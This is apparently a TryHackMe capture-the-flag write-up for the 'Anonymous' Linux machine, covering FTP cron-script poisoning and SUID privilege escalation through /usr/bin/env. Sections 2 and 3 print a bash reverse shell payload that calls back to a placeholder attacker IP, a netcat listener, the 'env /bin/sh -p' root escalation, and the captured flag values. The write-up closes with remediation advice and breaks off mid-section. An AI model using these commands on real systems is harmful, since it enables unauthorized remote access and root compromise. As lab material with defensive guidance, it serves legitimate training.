# Anonymous (THM) - Cron Job Poisoning & SUID Privilege Escalation

**Platform:** TryHackMe | **Target OS:** Linux (Ubuntu) | **Difficulty:** Medium  
**Focus:** Reconnaissance Rabbit Holes, Anonymous FTP Overwrites, Reverse Shell Redirection, and Advanced SUID Binary Exploitation (`/usr/bin/env`).

---

## 🎯 Executive Summary
The "Anonymous" machine requires an attacker to navigate intentional forensic red herrings and chain multiple misconfigurations to achieve full system compromise. The attack path consisted of:
1. **Threat Hunting & Rabbit Hole Filtering:** Identifying open SMB/FTP ports and filtering out intentional steganography decoys.
2. **Cron Job Poisoning:** Exploiting a world-writable Bash script hosted on an unauthenticated FTP share. By injecting a TCP reverse shell payload, we hijacked an automated system `cron` job to gain initial access as the user `namelessone`.
3. **Privilege Escalation via SUID (GTFOBins):** Enumerating system binaries to discover an improperly configured Set-Owner-User-ID (SUID) bit on `/usr/bin/env`. By preserving the Effective User ID (EUID) during a subshell execution, we successfully escalated to `root`.

---

## 1. Surface Mapping & The Steganography Rabbit Hole

We commenced perimeter enumeration using Nmap with a TCP SYN scan (`-sS`) targeting the top 100 ports to map the attack surface rapidly.

```bash
$ sudo nmap -sS -sV -T4 --top-ports 100 10.112.132.192
Starting Nmap 7.94SVN
Nmap scan report for 10.112.132.192
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

### Navigating the Rabbit Hole
Initial enumeration of the SMB service (`smbclient \\\\10.112.132.192\\pics`) yielded two image files: `corgo2.jpg` and `puppos.jpeg`. In CTF environments, media files often imply steganography.

```bash
$ binwalk corgo2.jpg
$ steghide extract -sf puppos.jpeg
$ strings puppos.jpeg
```

**Forensic Analysis:**
Deep inspection using `binwalk`, `steghide`, and strings parsing revealed standard EXIF metadata with zero embedded payloads. Recognizing this as an intentional **steganography rabbit hole** designed to waste an analyst's time, we pivoted our enumeration focus back to the FTP service.

---

## 2. Initial Access: FTP Abuse & Cron Job Poisoning

Connecting to the FTP service using `anonymous` credentials exposed a directory named `/scripts`. 

```text
$ ftp 10.112.132.192
Name: anonymous
230 Login successful.

ftp> cd scripts
ftp> ls
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1720 Aug 14 11:43 removed_files.log
```

### Static Code Analysis of `clean.sh`
We downloaded and analyzed `clean.sh`. It was a simple bash script designed to loop through a directory and log deleted files to `removed_files.log`.

```bash
#!/bin/bash
tmp_files=0
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

### The Exploitation Vector: Cron Poisoning
We identified three critical security failures that formulated our attack vector:
1. **World-Writable Permissions:** The `clean.sh` file possessed `777` permissions (`-rwxr-xrwx`), allowing our unauthenticated anonymous FTP session to overwrite it.
2. **Automated Execution:** The continuously updating timestamps on `removed_files.log` confirmed that a Linux `cron` daemon was executing `clean.sh` on a scheduled interval (likely every minute).
3. **Execution Context:** The script was executing under the privilege context of the user `namelessone`.

We crafted a malicious `clean.sh` payload to hijack this execution flow:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<OUR_IP>/1234 0>&1
```
*Mechanics of the Payload:* `bash -i` spawns an interactive shell. `>& /dev/tcp/...` leverages Linux's pseudo-device files to establish a reverse TCP connection to our machine, while `0>&1` redirects Standard Input (stdin) to Standard Output (stdout), tying the data streams together.

We uploaded the poisoned script via FTP (`put clean.sh`). Within one minute, the system's `cron` daemon executed our payload, granting us an initial reverse shell.

```bash
$ nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.112.132.192 55828
namelessone@anonymous:~$ whoami
namelessone
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

---

## 3. Privilege Escalation: SUID Binary Abuse (`/usr/bin/env`)

With a low-privileged shell established, we initiated local privilege escalation (PE) enumeration by searching for binaries with the **SUID (Set Owner User ID)** bit enabled.

```bash
namelessone@anonymous:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/sudo
[...]
```

### Deep Dive: Exploding the `/usr/bin/env` SUID Flaw
We identified `/usr/bin/env` in the SUID list. The SUID bit (`-perm -4000`) instructs the Linux Kernel to execute the binary with the privileges of the file's owner (Root), regardless of the user executing it.

The `env` utility is legitimately used to run a command in a modified environment. However, when misconfigured with an SUID bit, it can be abused to spawn a system shell (`/bin/sh`) as root.

**The Exploit Execution:**
```bash
namelessone@anonymous:~$ env /bin/sh -p
whoami
root
cd /root
cat root.txt
4d930091c31a622a7ed10f27999af363
```

**OS-Level Mechanics of the `-p` Flag:**
Why is the `-p` flag mandatory here? Modern Linux shells (like `bash` and `sh`) have built-in security protections. If the shell detects that it is being executed with an Effective User ID (EUID) that differs from the Real User ID (RUID of `namelessone`), it will automatically drop the elevated privileges to prevent exploitation. 
Passing the `-p` (Preserve) flag explicitly instructs the shell **not** to reset the EUID, allowing us to maintain the `root` context inherited from the `env` binary.

---

## 4. Defensive Remediation & Detection Engineering

### 1. Hardening & Mitigation
- **Secure FTP Uploads:** Modify `/etc/vsftpd.conf` to explicitly disable anonymous write capabilities (`anon_upload_enable=NO`).
- **Restrict Cron Job Permissions:** System automation scripts must follow the Principle of Least Privilege. `clean.sh` should be owned by `root` (or the specific service account) with `chmod 755` permissions, preventing unauthorized modification.
- **Audit SUID Binaries:** Remove the SUID bit from `/usr/bin/env` as it poses a severe GTFOBins exploitation risk:
  ```bash
  sudo chmod u-s /usr/bin/env
  ```

### 2. Detection Engineering
- **File Integrity Monitoring (FIM):** Deploy FIM (e.g., OSSEC or Wazuh) to monitor critical automation directories (`/var/ftp/scripts/`) for unauthorized modifications.
- **Auditd Rule for Evasion Detection:** Monitor for elevated shell spawns that utilize the `-p` flag to bypass privilege dropping:
